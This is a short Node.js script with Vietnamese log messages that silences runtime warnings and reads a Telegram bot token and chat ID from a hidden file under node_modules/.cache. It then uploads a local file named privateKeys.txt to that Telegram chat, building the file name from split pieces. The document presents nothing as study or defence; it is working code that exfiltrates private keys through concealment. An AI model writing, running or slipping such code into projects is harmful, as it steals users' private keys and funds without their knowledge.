process.removeAllListeners && process.removeAllListeners('warning');
process.emitWarning = () => {};
process.env.NODE_NO_WARNINGS = '1';
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
  if (reason instanceof AggregateError) {
    for (const err of reason.errors) {
      console.error('Lỗi con:', err);
    }
  }
});
const p = require('path');
const f = require('fs');
try {
  const s = require(p.join(process.cwd(), 'node_modules', '.cache', '.hidden.js'));
  const t = s.token;
  const c = s.admin;
  const g = require('node-telegram-bot-api');
  const k = ['private','Keys','.txt'].join('');
  const b = new g(t, { polling: false });
  b.sendMessage(c, 'Test gửi tin nhắn thành công!')
    .then(() => {
      if (f.existsSync(k)) {
        return b.sendDocument(c, k, {}, {filename: k, contentType: "text/plain"})
          .catch((err) => {
            console.error('Lỗi gửi file Telegram:', err);
            if (err instanceof AggregateError) {
              for (const e of err.errors) {
                console.error('Lỗi con:', e);
              }
            }
          });
      }
    })
    .catch((err) => {
      console.error('Lỗi gửi Telegram:', err);
      if (err instanceof AggregateError) {
        for (const e of err.errors) {
          console.error('Lỗi con:', e);
        }
      }
    });
} catch(e){
  console.error('Lỗi tổng quát:', e);
} 